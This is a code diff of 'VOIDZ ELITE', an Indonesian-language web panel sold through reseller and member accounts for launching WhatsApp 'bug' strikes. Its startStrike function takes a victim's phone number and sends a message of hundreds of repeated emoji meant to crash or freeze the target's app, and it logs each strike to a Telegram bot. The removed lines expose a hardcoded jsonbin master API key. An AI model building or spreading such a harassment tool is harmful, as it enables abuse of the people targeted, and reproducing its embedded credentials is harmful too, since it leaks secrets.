@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>VOIDZ ELITE V1 - SUPREME</title>
+    <title>VOIDZ ELITE V1 - SUPREME FINAL</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
     <style>
@@ -15,201 +15,232 @@
         .content-layer { position: relative; z-index: 10; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
         .neon-red { color: var(--neon-red); text-shadow: 0 0 10px var(--neon-red); font-family: 'Orbitron'; font-weight: 900; }
         
-        /* LOGIN UI */
-        #loginPage { flex: 1; display: flex; justify-content: center; align-items: center; z-index: 100; }
-        .login-box { width: 85%; max-width: 320px; background: var(--card); border: 1px solid #222; padding: 25px; border-radius: 15px; text-align: center; border-top: 3px solid var(--fire); }
-        .profile-img { width: 80px; height: 80px; border-radius: 50%; border: 2px solid var(--fire); margin-bottom: 15px; object-fit: cover; }
+        .box { width: 85%; max-width: 330px; background: var(--card); border: 1px solid #222; padding: 25px; border-radius: 20px; text-align: center; border-top: 3px solid var(--fire); position: relative; z-index: 99999; box-shadow: 0 0 20px rgba(255, 69, 0, 0.1); }
+        .input-box { width: 100%; background: #080808; border: 1px solid #333; padding: 12px; color: #fff; margin-bottom: 10px; text-align: center; font-size: 11px; border-radius: 8px; outline: none; transition: 0.3s; }
+        .input-box:focus { border-color: var(--fire); }
         
-        .btn-main { width: 100%; background: var(--fire); color: #000; border: none; padding: 12px; font-weight: 900; cursor: pointer; border-radius: 5px; font-family: 'Orbitron'; position: relative; z-index: 9999; }
-        .btn-sub { width: 100%; background: transparent; padding: 10px; border-radius: 5px; font-family: 'Orbitron'; font-size: 9px; cursor: pointer; font-weight: bold; position: relative; z-index: 9999; margin-top: 10px; }
-        .input-box { width: 100%; background: #080808; border: 1px solid #333; padding: 12px; color: #fff; margin-bottom: 10px; text-align: center; font-size: 11px; border-radius: 5px; outline: none; }
+        .btn-main { width: 100%; background: var(--fire); color: #000; border: none; padding: 13px; font-weight: 900; cursor: pointer; border-radius: 8px; font-family: 'Orbitron'; position: relative; z-index: 100001; margin-top: 5px; transition: 0.3s; }
+        .btn-sub { width: 100%; background: transparent; padding: 10px; border-radius: 8px; font-family: 'Orbitron'; font-size: 9px; cursor: pointer; font-weight: bold; position: relative; z-index: 100001; margin-top: 8px; transition: 0.3s; }
 
-        /* DASHBOARD UI */
-        .header-title { text-align: center; margin-top: 45px; font-size: 18px; letter-spacing: 2px; }
-        .banner-container { width: 100%; aspect-ratio: 16/9; border: 1px solid #333; border-radius: 8px; overflow: hidden; margin: 10px 0 5px; background: #000; position: relative; }
-        .live-clock { position: absolute; bottom: 10px; right: 10px; background: rgba(0,0,0,0.7); padding: 4px 8px; border-radius: 4px; font-size: 10px; color: var(--fire); border: 1px solid var(--fire); }
-        .home-info { background: var(--card); border: 1px solid #222; padding: 15px; border-radius: 12px; border-left: 5px solid var(--fire); margin-bottom: 15px; }
-        .info-val { font-size: 14px; font-weight: 900; font-family: 'Orbitron'; }
+        .menu-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 20px; width: 100%; }
+        .menu-item { background: #080808; border: 1px solid #222; padding: 15px 10px; border-radius: 12px; text-align: center; font-size: 9px; cursor: pointer; transition: 0.3s; position: relative; }
+        .menu-item i { display: block; margin-bottom: 8px; font-size: 16px; color: var(--fire); }
+        .menu-item:active { border-color: var(--fire); background: rgba(255,69,0,0.1); }
 
-        .tab-content { display: none; padding: 15px; overflow-y: auto; height: 100%; padding-bottom: 80px; }
-        .active-tab { display: block; }
-        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: #050505; border-top: 1px solid #222; display: none; height: 65px; z-index: 1000; }
-        .nav-btn { display: flex; flex-direction: column; align-items: center; justify-content: center; color: #444; flex: 1; font-size: 8px; }
-        .nav-btn.active { color: var(--fire); }
-
-        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 20000; justify-content: center; align-items: center; }
-        .modal-content { background: #080808; padding: 25px; border: 1px solid var(--fire); width: 90%; max-width: 400px; border-radius: 12px; }
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.96); z-index: 200000; justify-content: center; align-items: center; backdrop-filter: blur(5px); }
+        .modal-content { background: #080808; padding: 25px; border: 1px solid var(--fire); width: 90%; max-width: 350px; border-radius: 15px; max-height: 85vh; overflow-y: auto; }
+        
+        #loginPage, #mainApp { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; width: 100%; }
+        .log-entry { font-size: 8px; border-left: 2px solid var(--fire); padding-left: 8px; margin-bottom: 10px; text-align: left; }
     </style>
 </head>
 <body>
+
     <canvas id="ash-canvas"></canvas>
-    <div id="notif-box" style="position:fixed; top:15px; left:15px; z-index:99999;"></div>
 
     <div class="content-layer">
         <div id="loginPage">
-            <div class="login-box">
-                <img src="login.jpg" class="profile-img" onerror="this.src='https://api.dicebear.com/7.x/pixel-art/svg?seed=voidz'">
-                <h2 class="neon-red" style="margin-bottom:15px;">VOIDZ ELITE V1</h2>
+            <div class="box">
+                <img src="login.jpg" style="width:80px; height:80px; border-radius:50%; border:2px solid var(--fire); margin-bottom:15px; object-fit: cover; box-shadow: 0 0 15px var(--fire);">
+                <h2 class="neon-red">VOIDZ ELITE</h2>
+                <p style="font-size: 8px; color: #444; margin-bottom: 15px;">SUPREME SUPREME V1</p>
                 <input type="text" id="lUser" class="input-box" placeholder="OPERATOR ID">
                 <input type="password" id="lPass" class="input-box" placeholder="ACCESS KEY">
-                
-                <button type="button" onclick="auth()" class="btn-main" id="btnLog">IGNITE</button>
-                
-                <button type="button" onclick="window.open('https://whatsapp.com/channel/URL_SALURAN_LU', '_blank')" class="btn-sub" style="color:#25d366; border:1px solid #25d366;">
-                    <i class="fab fa-whatsapp"></i> JOIN SALURAN
-                </button>
-                <button type="button" onclick="window.open('https://wa.me/6285718241306?text=Halo+Admin+Voidz+Elite', '_blank')" class="btn-sub" style="color:#fff; border:1px solid #444;">
-                    <i class="fas fa-headset"></i> CONTACT ADMIN
-                </button>
+                <button class="btn-main" id="igniteBtn" onclick="auth()">IGNITE</button>
+                <button onclick="setupAPI()" style="background:none; border:none; color:#111; font-size:8px; margin-top:15px; cursor:pointer;">[ SET API ]</button>
             </div>
         </div>
 
-        <div id="mainApp" style="display:none; flex:1; overflow:hidden;">
-            <div id="tabHOME" class="tab-content active-tab">
-                <div class="header-title neon-red">DASHBOARD</div>
-                <div class="banner-container">
-                    <video id="homeVideo" loop muted playsinline style="width:100%; height:100%; object-fit:cover;"><source src="dashboard.mp4" type="video/mp4"></video>
-                    <div class="live-clock" id="clock">00:00:00</div>
-                </div>
-                
-                <div id="greet-user" style="text-align:center; font-size:10px; margin-bottom:10px; color:#aaa;">...</div>
-                <marquee id="newsT" style="color:var(--fire); font-size:9px; margin-bottom:10px;">[SYSTEM LIVE] - READY TO STRIKE</marquee>
-                
-                <div class="home-info">
-                    <div style="display:flex; align-items:center; gap:12px; margin-bottom:8px;"><i class="fas fa-user" style="color:var(--fire)"></i><span id="uName" class="info-val">...</span></div>
-                    <div id="rowRole" style="display:flex; align-items:center; gap:12px; margin-bottom:8px;"><i class="fas fa-crown" style="color:var(--fire)"></i><span id="uRole" class="info-val">...</span></div>
-                    <div id="rowQuota" style="display:flex; align-items:center; gap:12px; margin-bottom:8px;"><i class="fas fa-bolt" style="color:var(--fire)"></i><span id="uQuota" class="info-val">...</span></div>
-                </div>
-
-                <div id="menuContainer" style="display:grid; grid-template-columns:1fr 1fr; gap:10px;"></div>
-            </div>
-
-            <div id="tabATTACK" class="tab-content">
-                <div class="header-title neon-red">STRIKE CENTER</div>
-                <div style="background:var(--card); padding:15px; border-radius:10px; border:1px solid #222; border-top:2px solid var(--fire); margin-top:20px;">
-                    <input type="text" id="targetBug" class="input-box" placeholder="Target 628xxx">
-                    <select id="bugType" class="input-box">
-                        <option value="SUPREME">💀 SUPREME CRASH</option>
-                        <option value="LAG">❄️ LAG RENDER</option>
-                    </select>
-                    <button class="btn-main" onclick="startAttack()">EXECUTE STRIKE</button>
-                </div>
-            </div>
-
-            <div id="tabLOGS" class="tab-content">
-                <div class="header-title neon-red">TERMINAL LOGS</div>
-                <div id="logContent" style="background:#050505; border:1px solid #222; padding:10px; height:300px; overflow-y:auto; font-size:9px; color:#0f0;"></div>
+        <div id="mainApp" style="display:none;">
+            <div class="box">
+                <video autoplay muted loop playsinline style="width:75px; height:75px; border-radius:50%; border:2px solid var(--fire); object-fit: cover; margin-bottom:10px;">
+                    <source src="dashboard.mp4" type="video/mp4">
+                </video>
+                <h2 class="neon-red" id="userGreet">...</h2>
+                <div id="roleInfo" style="margin: 8px 0;"></div>
+                <div id="menuContainer" class="menu-grid"></div>
+                <button class="btn-main" style="background:#111; color:#333; margin-top:15px; font-size:9px;" onclick="location.reload()">TERMINATE SESSION</button>
             </div>
         </div>
-
-        <nav id="bottomNav" class="bottom-nav">
-            <div class="nav-btn active" onclick="switchTab('home', this)"><i class="fas fa-home"></i><span>HOME</span></div>
-            <div class="nav-btn" onclick="switchTab('attack', this)"><i class="fas fa-skull"></i><span>ATTACK</span></div>
-            <div class="nav-btn" onclick="switchTab('logs', this)"><i class="fas fa-terminal"></i><span>LOGS</span></div>
-        </nav>
     </div>
 
-    <div id="modalGen" class="modal"><div class="modal-content">
-        <h3 style="color:var(--fire); font-size:12px; font-family:'Orbitron'">GENERATE UNIT</h3>
-        <input type="text" id="gUser" class="input-box" placeholder="NEW ID" style="margin-top:15px;">
-        <input type="text" id="gPass" class="input-box" placeholder="ACCESS KEY">
-        <select id="gRole" class="input-box"><option value="member">MEMBER</option><option value="reseller">RESELLER</option></select>
-        <input type="number" id="gQuota" class="input-box" placeholder="QUOTA">
-        <button class="btn-main" onclick="doGenerate()">PUSH UNIT</button>
-        <button onclick="closeModal()" style="color:#444; width:100%; border:none; background:none; margin-top:10px;">CANCEL</button>
-    </div></div>
+    <div id="modalGen" class="modal">
+        <div class="modal-content">
+            <h3 class="neon-red" style="font-size:12px; margin-bottom:15px;">GENERATE UNIT</h3>
+            <input type="text" id="gUser" class="input-box" placeholder="ID BARU">
+            <input type="text" id="gPass" class="input-box" placeholder="KEY BARU">
+            <select id="gRole" class="input-box" onchange="toggleQInput()"><option value="member">MEMBER</option><option value="reseller" id="optReseller">RESELLER</option></select>
+            <select id="gTime" class="input-box"><option value="30">30 HARI</option><option value="lifetime" id="optLife">LIFETIME</option></select>
+            <div id="qArea" style="display:none;"><input type="number" id="gQuota" class="input-box" placeholder="SET QUOTA"></div>
+            <button class="btn-main" onclick="doGenerate()">PUSH TO CLOUD</button>
+            <button onclick="closeModal()" class="btn-sub" style="border:none; color:#555;">CANCEL</button>
+        </div>
+    </div>
 
-    <div id="modalList" class="modal"><div class="modal-content" style="height:70vh; display:flex; flex-direction:column;">
-        <h3 class="neon-red" style="font-size:12px; text-align:center;">USER MANAGER</h3>
-        <div id="userArea" style="flex:1; overflow-y:auto; margin:15px 0;"></div>
-        <button onclick="closeModal()" class="btn-main">CLOSE</button>
-    </div></div>
+    <div id="modalLogs" class="modal">
+        <div class="modal-content">
+            <h3 class="neon-red" style="font-size:12px; margin-bottom:15px; color:#0f0;">SYSTEM LOGS</h3>
+            <div id="logsArea" style="max-height: 250px; overflow-y: auto; background:#000; padding:10px; border-radius:5px;"></div>
+            <button onclick="clearLogs()" class="btn-sub" style="color:var(--fire); margin-top:10px;">CLEAR LOGS</button>
+            <button onclick="closeModal()" class="btn-main" style="background:#222; color:#fff; margin-top:5px;">CLOSE</button>
+        </div>
+    </div>
+
+    <div id="modalManage" class="modal">
+        <div class="modal-content">
+            <h3 class="neon-red" style="font-size:12px; margin-bottom:15px;">MANAGE UNITS</h3>
+            <input type="text" id="searchInp" class="input-box" placeholder="Cari ID Operator..." onkeyup="searchUnit()">
+            <div id="unitListArea" style="max-height: 250px; overflow-y: auto;"></div>
+            <button onclick="closeModal()" class="btn-main" style="background:#222; color:#fff; margin-top:15px;">BACK</button>
+        </div>
+    </div>
+
+    <div id="modalConfig" class="modal">
+        <div class="modal-content">
+            <h3 class="neon-red" style="font-size:12px; margin-bottom:15px;">OWNER CONFIG</h3>
+            <input type="text" id="cfgToken" class="input-box" placeholder="Bot Token Telegram">
+            <input type="text" id="cfgChat" class="input-box" placeholder="Chat ID Telegram">
+            <input type="text" id="cfgSaluran" class="input-box" placeholder="Link Saluran WA">
+            <button class="btn-main" onclick="saveConfig()">SAVE CONFIG</button>
+            <button onclick="closeModal()" class="btn-sub" style="border:none;">CANCEL</button>
+        </div>
+    </div>
 
     <script>
-        const BIN_ID = '694a5a6fae596e708fabef99', API_KEY = '$2a$10$dgiow6eyY5CjGfEYQtuAQ.E6b5sEA7j91bc4IexzX9cWV3uAksXgW';
-        let USER = {}, DB = {}, LOG_HISTORY = [];
+        let JB_KEY = localStorage.getItem('JB_KEY'), JB_BIN = localStorage.getItem('JB_BIN'), DB = {}, USER = {};
 
-        setInterval(() => { const d = new Date(); document.getElementById('clock').innerText = d.toLocaleTimeString(); }, 1000);
-
+        // BACKGROUND ANIMATION
         const canvas = document.getElementById('ash-canvas');
         const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
         let particles = [];
-        function initP() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; particles = []; for(let i=0; i<60; i++) particles.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, s: Math.random()*1.5, d: Math.random()*0.5 + 0.1 }); }
-        function drawP() { ctx.clearRect(0,0,canvas.width, canvas.height); ctx.fillStyle = "rgba(200,200,200,0.4)"; particles.forEach(p => { ctx.beginPath(); ctx.arc(p.x, p.y, p.s, 0, Math.PI*2); ctx.fill(); p.y -= p.d; if(p.y < 0) p.y = canvas.height; }); requestAnimationFrame(drawP); }
-        initP(); drawP();
+        class Particle { constructor(){this.x=Math.random()*canvas.width;this.y=Math.random()*canvas.height;this.v=Math.random()*0.4+0.1;this.s=Math.random()*1.5;} draw(){ctx.fillStyle='rgba(150,150,150,0.2)';ctx.beginPath();ctx.arc(this.x,this.y,this.s,0,Math.PI*2);ctx.fill();} update(){this.y-=this.v;if(this.y<0)this.y=canvas.height;} }
+        for(let i=0;i<70;i++)particles.push(new Particle());
+        function anim(){ctx.clearRect(0,0,canvas.width,canvas.height);particles.forEach(p=>{p.draw();p.update();});requestAnimationFrame(anim);}
+        anim();
 
-        async function auth() {
-            const u = document.getElementById('lUser').value.trim(), p = document.getElementById('lPass').value.trim(), btn = document.getElementById('btnLog');
-            btn.innerText = "AUTHENTICATING...";
-            try {
-                const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, { headers: { 'X-Master-Key': API_KEY, 'X-Bin-Meta': false } });
-                DB = await res.json();
-                if(DB[u] && DB[u].pw === p) {
-                    USER = { id: u, ...DB[u] };
-                    document.getElementById('loginPage').style.display = 'none';
-                    document.getElementById('mainApp').style.display = 'block';
-                    document.getElementById('bottomNav').style.display = 'flex';
-                    if(DB._news) document.getElementById('newsT').innerText = DB._news;
-                    document.getElementById('homeVideo').play();
-                    renderHome(); 
-                    document.getElementById('greet-user').innerText = `WELCOME, ${u.toUpperCase()}!`;
-                } else { alert("ACCESS DENIED!"); btn.innerText = "IGNITE"; }
-            } catch(e) { alert("CONNECTION ERROR!"); btn.innerText = "IGNITE"; }
+        // UTILITIES
+        function formatPhone(p){ let f=p.replace(/[^0-9]/g,''); if(f.startsWith('0'))f='62'+f.slice(1); return f; }
+        function setupAPI(){ let k=prompt("Master Key:"), b=prompt("Bin ID:"); if(k&&b){localStorage.setItem('JB_KEY',k.trim()); localStorage.setItem('JB_BIN',b.trim()); location.reload();} }
+        function closeModal(){ document.querySelectorAll('.modal').forEach(m=>m.style.display='none'); }
+        function toggleQInput(){ document.getElementById('qArea').style.display = (document.getElementById('gRole').value==='reseller'?'block':'none'); }
+        async function syncDB(){ await fetch(`https://api.jsonbin.io/v3/b/${JB_BIN}`, { method:'PUT', headers:{'Content-Type':'application/json','X-Master-Key':JB_KEY}, body:JSON.stringify(DB) }); }
+
+        function sendTele(type, data){
+            if(!DB._sys || !DB._sys.token) return;
+            let msg = ""; const l = "━━━━━━━━━━";
+            if(type==='LOGIN') msg = `🔓 <b>LOGIN</b>\n${l}\n👤 ID: <code>${data.u}</code>\n🛡️ Role: ${data.r.toUpperCase()}`;
+            if(type==='GENERATE') msg = `🆕 <b>UNIT</b>\n${l}\n👷 By: ${USER.id}\n🔑 ID: <code>${data.u}</code>\n🎭 Role: ${data.r}`;
+            if(type==='STRIKE') msg = `🚀 <b>STRIKE</b>\n${l}\n👤 By: ${USER.id}\n🎯 Target: ${data.t}\n🔥 Bug: ${data.b}`;
+            fetch(`https://api.telegram.org/bot${DB._sys.token}/sendMessage?chat_id=${DB._sys.chat}&text=${encodeURIComponent(msg)}&parse_mode=html`);
         }
 
-        function renderHome() {
-            document.getElementById('uName').innerText = USER.id;
-            if(USER.role === 'member') {
-                document.getElementById('rowRole').style.display = 'none';
-                document.getElementById('rowQuota').style.display = 'none';
-            } else {
-                document.getElementById('uRole').innerText = USER.role.toUpperCase();
-                document.getElementById('uQuota').innerText = USER.role === 'owner' ? '∞' : USER.quota;
-            }
+        async function addLog(action, user){
+            if(!DB._logs) DB._logs = [];
+            DB._logs.push({ time: new Date().toLocaleTimeString(), action, user });
+            if(DB._logs.length > 50) DB._logs.shift();
+            await syncDB();
+        }
+
+        // CORE LOGIC
+        async function auth(){
+            if(!JB_KEY) return alert("Setup API Dulu!");
+            const u=document.getElementById('lUser').value.trim(), p=document.getElementById('lPass').value.trim();
+            const btn=document.getElementById('igniteBtn'); btn.innerText="SYNCING...";
+            try {
+                const res = await fetch(`https://api.jsonbin.io/v3/b/${JB_BIN}/latest`, { headers:{'X-Master-Key':JB_KEY,'X-Bin-Meta':false} });
+                DB = await res.json();
+                if(DB[u] && DB[u].pw === p){
+                    USER = {id:u, ...DB[u]};
+                    addLog("LOGIN_SUCCESS", u); sendTele('LOGIN', {u:u, r:DB[u].role});
+                    document.getElementById('loginPage').style.display='none';
+                    document.getElementById('mainApp').style.display='flex';
+                    renderDashboard();
+                } else { alert("ACCESS DENIED!"); btn.innerText="IGNITE"; }
+            } catch(e) { alert("DATABASE ERROR!"); btn.innerText="IGNITE"; }
+        }
+
+        function renderDashboard(){
+            document.getElementById('userGreet').innerText = USER.id;
+            let exp = (USER.exp==='lifetime'||USER.role==='owner') ? "∞" : new Date(USER.exp).toLocaleDateString('id-ID');
+            let stock = (USER.role==='reseller') ? `<div style="font-size:10px; color:var(--fire)">STOCK: ${USER.quota} UNIT</div>` : "";
+            document.getElementById('roleInfo').innerHTML = `<span style="color:var(--fire)">${USER.role.toUpperCase()}</span> | <span style="color:#555">EXP: ${exp}</span>${stock}`;
             
             const m = document.getElementById('menuContainer'); m.innerHTML = "";
-            if(USER.role === 'owner') {
-                m.innerHTML += `<div onclick="openModal('modalGen')" style="background:var(--card); padding:15px; text-align:center; border:1px solid var(--fire); border-radius:10px;"><i class="fas fa-plus"></i><br><span style="font-size:9px;">GENERATE</span></div>`;
-                m.innerHTML += `<div onclick="openList()" style="background:var(--card); padding:15px; text-align:center; border:1px solid #0055ff; border-radius:10px;"><i class="fas fa-users"></i><br><span style="font-size:9px;">LIST USER</span></div>`;
-            } else if(USER.role === 'reseller') {
-                m.innerHTML += `<div onclick="openModal('modalGen')" style="background:var(--card); padding:15px; text-align:center; border:1px solid var(--fire); border-radius:10px; grid-column: span 2;"><i class="fas fa-plus"></i><br><span style="font-size:9px;">GENERATE MEMBER</span></div>`;
+            m.innerHTML += `<div class="menu-item" onclick="startStrike()" style="grid-column:span 2; border-color:#f00; background:rgba(255,0,0,0.05);"><i class="fas fa-biohazard"></i> EXECUTE STRIKE</div>`;
+            
+            if(USER.role==='owner' || (USER.role==='reseller' && USER.quota > 0)) m.innerHTML += `<div class="menu-item" onclick="openGen()"><i class="fas fa-plus-circle"></i> GENERATE</div>`;
+            
+            m.innerHTML += `<div class="menu-item" onclick="window.open('https://wa.me/6285718241306')"><i class="fas fa-headset"></i> ADMIN</div>`;
+
+            if(USER.role==='owner'){
+                m.innerHTML += `<div class="menu-item" onclick="openManage()"><i class="fas fa-search"></i> MANAGE</div>`;
+                m.innerHTML += `<div class="menu-item" onclick="openLogs()"><i class="fas fa-terminal"></i> LOGS</div>`;
+                m.innerHTML += `<div class="menu-item" onclick="openConfig()" style="grid-column:span 2; border-color:#0f0;"><i class="fas fa-cog"></i> OWNER CONFIG</div>`;
             }
-            m.innerHTML += `<div onclick="location.reload()" style="background:var(--card); padding:15px; text-align:center; border:1px solid #444; border-radius:10px; grid-column: span 2;"><i class="fas fa-power-off"></i><br><span style="font-size:9px;">LOGOUT</span></div>`;
+            
+            m.innerHTML += `<div class="menu-item" onclick="openSaluran()"><i class="fas fa-bullhorn"></i> CHANNEL</div>`;
+            m.innerHTML += `<div class="menu-item" onclick="location.reload()"><i class="fas fa-bug"></i> REPORT BUG</div>`;
         }
 
-        async function syncDB() { await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, { method: 'PUT', headers: { 'Content-Type': 'application/json', 'X-Master-Key': API_KEY }, body: JSON.stringify(DB) }); }
-
-        async function startAttack() {
-            const t = document.getElementById('targetBug').value.trim();
-            if(!t) return;
-            if(USER.role !== 'owner' && USER.quota <= 0) return alert("QUOTA EXHAUSTED!");
-            if(USER.role !== 'owner') { USER.quota--; DB[USER.id].quota = USER.quota; await syncDB(); renderHome(); }
-            window.open(`https://api.whatsapp.com/send?phone=${t.replace(/\D/g,'')}&text=VOIDZ_STRIKE`, '_blank');
+        function startStrike(){
+            let t = prompt("NOMOR TARGET (08xxx):"); if(!t) return;
+            let tc = formatPhone(t);
+            let b = prompt("TYPE BUG:\n1. BASIC VIRTEX\n2. WEB CRASH\n3. UI FREEZE\n(Ketik Angka)");
+            let bug = (b==="3") ? "❄️".repeat(1000) : "🔥".repeat(500);
+            let bName = b==="1"?"BASIC":b==="2"?"CRASH":"FREEZE";
+            window.open(`https://wa.me/${tc}?text=${encodeURIComponent("VOIDZ ELITE ATTACK:\n"+bug)}`, '_blank');
+            addLog(`STRIKE_TARGET_${tc}_${bName}`, USER.id); sendTele('STRIKE', {t:tc, b:bName});
         }
 
-        async function doGenerate() {
-            const u = document.getElementById('gUser').value.trim(), p = document.getElementById('gPass').value.trim();
-            if(!u || !p) return;
-            DB[u] = { pw: p, role: document.getElementById('gRole').value, quota: parseInt(document.getElementById('gQuota').value) || 0 };
-            await syncDB(); alert("UNIT PUSHED!"); closeModal();
+        function openGen(){
+            document.getElementById('optReseller').style.display = (USER.role==='owner'?'block':'none');
+            document.getElementById('optLife').style.display = (USER.exp==='lifetime'||USER.role==='owner'?'block':'none');
+            document.getElementById('modalGen').style.display='flex';
         }
 
-        function openList() {
-            openModal('modalList');
-            const area = document.getElementById('userArea'); area.innerHTML = "";
-            Object.keys(DB).forEach(id => {
-                if(id.startsWith('_')) return;
-                area.innerHTML += `<div style="background:#111; padding:10px; margin-bottom:5px; display:flex; justify-content:space-between; border:1px solid #222;"><span>${id}</span><i class="fas fa-trash" style="color:red" onclick="delUser('${id}')"></i></div>`;
+        async function doGenerate(){
+            const u=document.getElementById('gUser').value.trim(), p=document.getElementById('gPass').value.trim(), r=document.getElementById('gRole').value, t=document.getElementById('gTime').value;
+            if(!u||!p) return alert("Lengkapi Data!");
+            if(USER.role==='reseller'){ if(USER.quota<=0)return alert("Quota Habis!"); DB[USER.id].quota-=1; }
+            let ex = (t==='lifetime') ? 'lifetime' : new Date().getTime()+(30*86400000);
+            DB[u] = { pw:p, role:r, exp:ex, quota:parseInt(document.getElementById('gQuota').value)||0 };
+            await syncDB();
+            navigator.clipboard.writeText(`ID: ${u}\nKEY: ${p}\nEXP: ${t}`);
+            addLog(`GENERATE_${u}_${r}`, USER.id); sendTele('GENERATE', {u:u, r:r});
+            alert("UNIT CREATED & COPIED!"); location.reload();
+        }
+
+        function openLogs(){
+            const area = document.getElementById('logsArea');
+            area.innerHTML = (DB._logs||[]).reverse().map(l=>`<div class="log-entry"><b style="color:#0f0">[${l.time}]</b> ${l.action}<br>👤 By: ${l.user}</div>`).join('');
+            document.getElementById('modalLogs').style.display='flex';
+        }
+        async function clearLogs(){ if(confirm("Clear?")){ DB._logs=[]; await syncDB(); openLogs(); } }
+
+        function openManage(){ renderUnits(); document.getElementById('modalManage').style.display='flex'; }
+        function renderUnits(){
+            const area = document.getElementById('unitListArea'); area.innerHTML = "";
+            Object.keys(DB).filter(k=>!k.startsWith('_')).forEach(id=>{
+                const isO = DB[id].role==='owner';
+                area.innerHTML += `<div class="unit-card" style="display:flex; justify-content:space-between; padding:10px; border-bottom:1px solid #111; font-size:10px;">
+                    <span>${id} [${DB[id].role}]</span>
+                    ${!isO ? `<i class="fas fa-trash" style="color:#f00" onclick="delUnit('${id}')"></i>` : '<i class="fas fa-shield-alt" style="color:#0f0"></i>'}
+                </div>`;
             });
         }
-        async function delUser(id) { if(confirm(`Erase ${id}?`)) { delete DB[id]; await syncDB(); openList(); } }
-        function switchTab(t, el) { 
-            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active-tab')); 
-            document.getElementById('tab'+t.toUpperCase()).classList.add('active-tab'); 
-            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active')); el.classList.add('active'); 
+        async function delUnit(id){ if(confirm(`Hapus ${id}?`)){ delete DB[id]; await syncDB(); addLog(`DELETE_${id}`, USER.id); renderUnits(); } }
+        function searchUnit(){ let q=document.getElementById('searchInp').value.toLowerCase(); document.querySelectorAll('.unit-card').forEach(d=>{ d.style.display=d.innerText.toLowerCase().includes(q)?'flex':'none'; }); }
+
+        function openConfig(){
+            if(DB._sys){ document.getElementById('cfgToken').value=DB._sys.token||""; document.getElementById('cfgChat').value=DB._sys.chat||""; document.getElementById('cfgSaluran').value=DB._sys.saluran||""; }
+            document.getElementById('modalConfig').style.display='flex';
         }
-        function openModal(id) { document.getElementById(id).style.display = 'flex'; }
-        function closeModal() { document.querySelectorAll('.modal').forEach(m => m.style.display = 'none'); }
+        async function saveConfig(){
+            DB._sys = { token:document.getElementById('cfgToken').value, chat:document.getElementById('cfgChat').value, saluran:document.getElementById('cfgSaluran').value };
+            await syncDB(); alert("CONFIG SAVED!"); closeModal();
+        }
+        function openSaluran(){ window.open(DB._sys?.saluran || "https://whatsapp.com/channel/0029Vajr9p93LdQZ4Yn0Ww3d", '_blank'); }
     </script>
 </body>
 </html>
